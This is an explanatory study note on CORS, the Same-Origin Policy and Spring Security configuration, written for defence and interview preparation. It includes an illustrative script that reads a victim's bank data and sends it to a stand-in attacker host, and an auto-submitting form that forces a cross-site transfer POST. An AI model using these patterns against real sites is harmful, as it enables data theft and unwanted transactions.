CORS looks arbitrary until you understand that it isn't a server-side security feature at all — it's a **browser** rule, and it exists to relax an older rule that was blocking legitimate architectures. Note 10 covered it in passing; this is the full treatment, including the two questions everyone eventually asks.

> [!info] 🧭 Summary
> - **Same-Origin Policy (SOP)** is the base rule: JavaScript on one origin may not *read* responses from another. CORS is the standard way a server **opts out** of it for chosen origins.
> - **Origin = protocol + domain + port.** Any difference makes it cross-origin — `http` vs `https`, `amazon.com` vs `api.amazon.com`, `:443` vs `:8080`.
> - **CORS does not block requests.** The request is sent, the server processes it, the response comes back — the **browser refuses to hand it to JavaScript**. The side effects have already happened.
> - Which is why **Postman works and the browser doesn't**: CORS is enforced by browsers only. Postman has no origin and no SOP.
> - **Simple requests** (GET/POST/HEAD + a short list of headers + three content types) go straight out. Anything else triggers a **preflight `OPTIONS`** asking permission first.
> - **"Simple" ≠ safe.** It means "the web could already do this in 1998 via `<img>` and `<form>`", so forbidding it would break the web. The protection was never about sending — it's about **reading the response**.
> - `Content-Type: application/json` is **not** simple → every JSON `POST` preflights. This surprises everyone.
> - Key headers: `Access-Control-Allow-Origin`, `-Allow-Methods`, `-Allow-Headers`, `-Allow-Credentials`, `-Max-Age`, `-Expose-Headers`.
> - **`Allow-Credentials: true` cannot be combined with `Allow-Origin: *`** — the browser rejects it. Whitelist real origins.
> - **Spring Security gotcha**: configure CORS via `http.cors(...)`, not only `WebMvcConfigurer` — the filter chain rejects the unauthenticated preflight `OPTIONS` before MVC ever sees it.
> - **CORS protects response *reading*. CSRF protects unwanted *actions*.** Different threats, different defences — see [[16. CSRF Deep Dive]].
>

## 1. Why the rule exists

You're logged into Amazon. Your browser holds a session cookie for `amazon.com`. Now you open another tab:

```text
https://evil-hacker.com
```

Without any rule, its JavaScript could run:

```js
fetch("https://api.amazon.com/user/bank-details")
  .then(r => r.json())
  .then(data => send(data, "https://evil-hacker.com/collect"));
```

The browser would attach your Amazon cookies (the request goes to `amazon.com`), the API would answer, and the attacker's script would read your data. Every logged-in tab you own would be readable by every page you visit.

To prevent this, browsers enforce the **Same-Origin Policy**:

> A page may only *read* responses from its own origin.

---

## 2. What an origin is

```text
Origin = protocol + domain + port
```

| A | B | Same origin? |
|---|---|---|
| `https://amazon.com` | `https://amazon.com` | ✅ |
| `http://amazon.com` | `https://amazon.com` | ❌ protocol |
| `https://amazon.com` | `https://api.amazon.com` | ❌ domain (subdomains count!) |
| `https://amazon.com:443` | `https://amazon.com:8080` | ❌ port |
| `https://amazon.com/a` | `https://amazon.com/b` | ✅ path is irrelevant |

Two traps: **subdomains are different origins**, and `localhost:3000` → `localhost:8080` is cross-origin, which is why every developer meets CORS on day one of a React + Spring Boot project.

---

## 3. The problem SOP creates

Modern architecture is inherently cross-origin:

```text
Frontend:  https://app.company.com
Backend:   https://api.company.com
```

```js
fetch("https://api.company.com/users")   // blocked by SOP
```

But this is exactly what we **want**. So the backend needs a way to say: *it's fine, I trust that frontend*. That mechanism is **CORS — Cross-Origin Resource Sharing**.

---

## 4. The basic exchange

The browser adds the origin automatically; you cannot set or spoof it from JavaScript.

```text
GET /users HTTP/1.1
Host: api.company.com
Origin: https://app.company.com          <- added by the browser
```

The server answers:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.company.com
Content-Type: application/json

{ "users": [...] }
```

The browser compares:

```text
request Origin == Access-Control-Allow-Origin ?
   yes -> hand the response to JavaScript
   no  -> throw a CORS error, JS gets nothing
```

---

## 5. The most important misunderstanding

> **CORS does not block the request.**

```text
fetch(...)
   |
   +--> request IS sent
   +--> server DOES process it            <- side effects happen!
   +--> response IS received by the browser
   +--> browser HIDES it from JavaScript
```

The console message — *"has been blocked by CORS policy"* — describes the last step only. Two consequences people get wrong:

- **A CORS error does not mean your endpoint wasn't hit.** If it was a `POST /transfer`, the transfer may well have happened. (This is precisely why CSRF is a separate problem.)
- **CORS is not a server-side access control.** It protects *your users from other sites*, not *your API from attackers*. Anything that isn't a browser ignores it entirely. Authentication and authorization are still your job.

---

## 6. Why Postman works

A standard interview question.

```text
Browser fetch(...)  ->  CORS error
Postman / curl      ->  200 OK, full body
```

Because **CORS is enforced by the browser, not the server**. Postman has no origin, no Same-Origin Policy and no CORS check. The server behaves identically in both cases; only the client's willingness to expose the response differs.

The corollary for debugging: if `curl` works and the browser doesn't, the bug is in your **response headers**, not your endpoint.

---

## 7. Simple requests

The browser sends some cross-origin requests straight out with no permission check. A request is **simple** only if *all* of these hold:

**Method** is one of:

```text
GET
POST
HEAD
```

**Headers** are only from the safe-listed set:

```text
Accept
Accept-Language
Content-Language
Content-Type   (restricted, see below)
Range          (limited)
+ browser-managed headers
```

**`Content-Type`** (for POST) is one of exactly:

```text
application/x-www-form-urlencoded
multipart/form-data
text/plain
```

Simple — no preflight:

```js
fetch("/users", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" }
});
```

**Not** simple — preflight:

```js
fetch("/users", {
  method: "POST",
  headers: { "Content-Type": "application/json" }   // <- this alone triggers it
});
```

> [!warning] `application/json` always preflights
> Which means essentially **every modern API call preflights**, and so does every request carrying `Authorization: Bearer ...` or any `X-*` header. If your OPTIONS handling is broken, nothing works.

---

## 8. Why GET and POST are "simple" when they're clearly not safe

The question everyone eventually asks: *GET can read sensitive data and POST can modify resources — how are those "simple"?*

**"Simple" does not mean safe.** It means: *the web has always been able to do this, long before AJAX existed, so forbidding it now would break the world.*

### GET, since forever

```html
<img src="https://bank.com/account">
```

Loading that image issues `GET https://bank.com/account` with your cookies attached. `<script>`, `<link>`, `<iframe>` do the same. This has been true for ~30 years.

### POST, since forever

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

A cross-origin POST with cookies, no JavaScript API required. Also ~30 years old — and note that the three "simple" content types are exactly the three an HTML form can produce. That's not a coincidence; it's the definition.

### So what was CORS actually solving?

Not *"can a site send a request?"* — that was never preventable. But:

> **Can JavaScript READ the response?**

That's the new capability `XMLHttpRequest`/`fetch` introduced, and that's what needed a rule:

```text
Attacker site: fetch("https://bank.com/account")

Request  -> sent (cookies attached)
Response -> { "balance": 100000, "accountNumber": "123456" }
Reading  -> BLOCKED unless CORS allows it
```

### And why preflight for the rest?

Because `PUT`, `DELETE`, `PATCH`, custom headers and `application/json` **cannot be produced by an HTML form**. They are unambiguously programmatic API calls — new capability, new server contract, so the browser asks permission before the request reaches the server at all:

```text
Old capability  (form/img could do it)  ->  send it, hide the response
New capability  (only fetch can do it)  ->  ask first
```

That's the whole design in two lines.

---

## 9. Preflight

```js
fetch("/users/42", {
  method: "PUT",
  headers: { "Authorization": "Bearer xyz", "Content-Type": "application/json" }
});
```

The browser first sends:

```text
OPTIONS /users/42 HTTP/1.1
Origin: https://app.company.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
```

Note: **no body, no cookies, no `Authorization` header** — it's a question, not the request.

The server answers:

```text
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.company.com
Access-Control-Allow-Methods: GET,POST,PUT,DELETE
Access-Control-Allow-Headers: Authorization,Content-Type
Access-Control-Max-Age: 3600
```

Only then does the real request go out:

```text
Browser
   |  OPTIONS  ------------->  Backend
   |  <-- allowed --
   |  PUT /users/42  ------->  Backend
   |  <-- 200 + response --
   v
```

`Access-Control-Max-Age` caches the answer (browsers cap it — Chrome at 2 hours), which matters: without it you double your request count on every API call.

---

## 10. The headers

| Header | Purpose |
|---|---|
| `Access-Control-Allow-Origin` | which origin may read the response — **one value or `*`**, never a list |
| `Access-Control-Allow-Methods` | methods allowed (preflight response) |
| `Access-Control-Allow-Headers` | request headers allowed (preflight response) |
| `Access-Control-Allow-Credentials` | `true` → cookies / TLS client certs may be sent |
| `Access-Control-Max-Age` | how long to cache the preflight |
| `Access-Control-Expose-Headers` | which **response** headers JS may read beyond the safe-listed ones |

> [!warning] `Expose-Headers` is the forgotten one
> By default JavaScript can read only `Cache-Control`, `Content-Language`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`. Your `X-Total-Count` pagination header or a `Location` after a create is invisible until you expose it — and the symptom is `undefined`, not an error.

---

## 11. Credentials: JWT header vs session cookie

Where Spring developers get stuck.

### Bearer token in a header

```text
Authorization: Bearer abc123
```

No cookie involved. `Access-Control-Allow-Origin` (plus `Allow-Headers: Authorization`) is usually enough. The header is a non-simple header, so **every request preflights**.

### Session cookie

```text
Cookie: JSESSIONID=xyz
```

Cookies are **not** sent cross-origin unless both sides opt in:

```js
fetch(url, { credentials: "include" });
```

```text
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.company.com    <- must be exact, NOT *
```

> [!warning] `*` + credentials is illegal
> `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` is rejected by the browser outright. And it must be *rejected* — otherwise any site could read authenticated responses from any API, which is the exact attack SOP prevents. In Spring use `allowedOriginPatterns` or an explicit list; `setAllowedOrigins(List.of("*")) + setAllowCredentials(true)` throws at startup in Spring 6.
>
> `SameSite` also applies: a cross-site `fetch` won't carry a `SameSite=Lax` cookie at all, no matter what CORS says. See [[16. CSRF Deep Dive]] §8.

## 12. Configuring it in Spring Boot

The MVC way:

```java
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                        .allowedOrigins("https://app.company.com")
                        .allowedMethods("GET", "POST", "PUT", "DELETE")
                        .allowedHeaders("*");
            }
        };
    }
}
```

### The Spring Security gotcha

You configure the above, and still get CORS errors. Why?

```text
Request
   |
Security Filter Chain      <- runs FIRST
   |
   +-- OPTIONS /users has no Authorization header
   +-- -> 401, chain terminated
   |
   X   DispatcherServlet never runs
       your WebMvcConfigurer never runs
```

The preflight is anonymous **by design** — the browser deliberately omits credentials. Spring Security sees an unauthenticated request and rejects it, so the real request is never sent.

The fix is to let Spring Security handle CORS itself, via `CorsFilter`, which sits **before** authentication in the chain ([[1. Filters and SecurityFilterChain]]):

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .cors(Customizer.withDefaults())              // <- the missing line
        .csrf(csrf -> csrf.disable())
        .authorizeHttpRequests(a -> a.anyRequest().authenticated())
        .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()));
    return http.build();
}

@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.company.com", "https://admin.company.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Requested-With"));
    config.setExposedHeaders(List.of("X-Total-Count"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

`http.cors(withDefaults())` tells Spring Security to pick up the `CorsConfigurationSource` bean and short-circuit preflights with a `200`/`204` before authentication ever runs.

> [!tip] Debug order
> 1. Does `curl -i` return the endpoint fine? → the endpoint is fine, it's headers.
> 2. `curl -i -X OPTIONS -H "Origin: https://app.company.com" -H "Access-Control-Request-Method: PUT" <url>` → is the preflight answered, or 401?
> 3. 401 on the OPTIONS → you're missing `http.cors(...)`.
> 4. Response has no `Access-Control-Allow-Origin` → origin not in the whitelist (check the trailing slash and the port).

## 13. Why `*` is dangerous

```text
Access-Control-Allow-Origin: *
```

Means *any website may read my responses*.

- **Fine for**: genuinely public, unauthenticated APIs — a currency-rate feed, public docs.
- **Wrong for**: banking, payments, admin portals, anything behind auth. And it silently stops working the moment you add credentials, because `*` + credentials is illegal.

Whitelist:

```text
https://app.company.com
https://admin.company.com
```

> [!warning] Don't reflect the Origin header
> A common "fix" is to echo whatever `Origin` arrives back into `Allow-Origin` with `Allow-Credentials: true`. That is `*` with extra steps — every site is allowed, including the attacker's. Same for careless `allowedOriginPatterns("https://*.company.com")` when subdomains can be user-controlled.

## 14. "The response came back — can the page just show it anyway?"

No, not in a normal browser. The browser is the enforcer, and page JavaScript cannot overrule it:

```js
fetch("https://bank.com/account").then(r => r.json()).then(console.log);
// TypeError: Failed to fetch  /  blocked by CORS policy
```

```text
1. Request sent
2. Response received by the BROWSER
3. Browser checks CORS
4. Browser refuses to expose it to the page
```

The bytes exist inside the browser process. The page cannot reach them.

### Then why can I see the body in DevTools?

Because **DevTools belongs to you, not to the page**:

```text
Developer  (DevTools)  ->  can see the response
Page JS                ->  cannot
```

The browser will happily show you the response for debugging. That's not a leak — you already have full authority over your own browser; the security boundary is the *page's* script, not the *user*.

### Can CORS be bypassed at all?

| Route | Works? | Note |
|---|---|---|
| `chrome --disable-web-security` | yes | the user disabled their own protection; local dev only, never for normal browsing |
| Browser extension with host permissions | yes | elevated privileges granted by the user |
| Postman / curl / any server | yes | not a browser, no SOP |
| **Page JavaScript** | **no** | this is the boundary that matters |
| A proxy on your own server | yes | your backend fetches it — SOP never applied server-side |

> [!tip] The analogy
> **Server = club owner. Browser = security guard. Page JavaScript = visitor.**
> The owner says "only visitors from app.company.com may enter". The guard enforces it. The visitor cannot overrule the guard. And note the server never *hides* anything — it just states a policy that the browser volunteers to enforce.

---

## 15. CORS vs CSRF

They are constantly conflated, and they protect opposite halves of the same interaction.

```text
CORS asks:  can JavaScript from Origin A READ responses from Origin B?
CSRF asks:  can Origin A trick the browser into SENDING authenticated
            requests to Origin B?
```

The attacker in a CSRF attack **never reads the response** — they only need the action to succeed. So CORS is not violated and cannot help. Full treatment in [[16. CSRF Deep Dive]].

> [!warning] `csrf.disable()` will never fix a CORS error
> Different mechanism, different direction, different failure. If the console says "blocked by CORS policy", the answer is `http.cors(...)` and response headers — nothing to do with CSRF.

## ❓ Interview Questions

### Q1. What is CORS and what problem does it solve?

The Same-Origin Policy stops JavaScript reading cross-origin responses, which would otherwise break every SPA-plus-API architecture. CORS is the standard mechanism for a server to declare which origins *are* allowed to read its responses, via `Access-Control-*` headers the browser checks.

### Q2. What makes two URLs the same origin?

Identical protocol, domain and port. Path doesn't matter; subdomains are different origins.

### Q3. Does CORS block the request from reaching my server?

No. The request is sent and processed; the browser blocks JavaScript from reading the *response*. Side effects still happen — which is exactly why CSRF is a separate problem needing a separate defence.

### Q4. Why does it work in Postman but not the browser?

CORS is enforced only by browsers. Postman has no origin and no Same-Origin Policy, so it never performs the check.

### Q5. What is a preflight and when does it happen?

An `OPTIONS` request the browser sends before a non-simple request, carrying `Access-Control-Request-Method` and `-Request-Headers`. It's triggered by any method beyond GET/POST/HEAD, any non-safe-listed header (`Authorization`, `X-*`), or a `Content-Type` outside the three form types — so `application/json` always preflights.

### Q6. GET can read sensitive data and POST can modify it — why are they "simple"?

Because "simple" means "the web could already do it before AJAX" — `<img>` issued cross-origin GETs and `<form>` issued cross-origin POSTs decades ago, with cookies. Forbidding them would break the web. The new capability CORS governs is JavaScript *reading the response*, not sending the request.

### Q7. Why can't `Allow-Origin: *` be used with credentials?

Because it would let any website read authenticated responses from your API using the victim's cookies — the exact attack SOP exists to prevent. Browsers reject the combination; you must name the origin.

### Q8. I configured CORS in `WebMvcConfigurer` and still get errors. Why?

The Spring Security filter chain runs before MVC and 401s the anonymous preflight `OPTIONS`, so your MVC config never executes. Add `http.cors(Customizer.withDefaults())` with a `CorsConfigurationSource` bean so `CorsFilter` handles it ahead of authentication.

### Q9. Is CORS a security mechanism for my API?

Not for your API — for your *users*. It stops other sites reading responses in a victim's browser. It's irrelevant to curl, scripts, servers and mobile apps, so it never substitutes for authentication and authorization.

### Q10. The response body is visible in the Network tab but JS gets an error. Contradiction?

No. DevTools acts on behalf of the user, who already has full authority; the page's JavaScript does not. The boundary CORS enforces is around the script, not around you.

### Q11. CORS vs CSRF?

CORS controls whether a cross-origin script may **read** a response. CSRF protection controls whether a cross-origin page may cause an **authenticated action**. One protects data confidentiality, the other protects state integrity.

> [!tip] ⚡ Quick Recall
> - **SOP**: JS may not read cross-origin responses. **CORS**: the server's opt-out for chosen origins.
> - **Origin = protocol + domain + port.** Subdomains differ. Path doesn't count.
> - **CORS blocks *reading*, not sending.** The endpoint ran. Side effects happened.
> - **Postman works** because CORS is browser-only.
> - **Simple** = GET/POST/HEAD + safe headers + `x-www-form-urlencoded` | `multipart/form-data` | `text/plain`. **`application/json` preflights.**
> - "Simple" means *the web always allowed it* (`<img>`, `<form>`), not *safe*.
> - **Preflight** = `OPTIONS` with `Access-Control-Request-Method/Headers`, answered with `Allow-*` + `Max-Age`. No cookies on it.
> - `Allow-Credentials: true` **cannot** pair with `Allow-Origin: *`. Never reflect the `Origin` header.
> - `Expose-Headers` for custom response headers, or JS reads `undefined`.
> - **Spring: `http.cors(...)` + `CorsConfigurationSource`** — MVC-only config is bypassed because Security 401s the preflight first.
> - **CORS = reading responses. CSRF = performing actions.** `csrf.disable()` never fixes CORS.
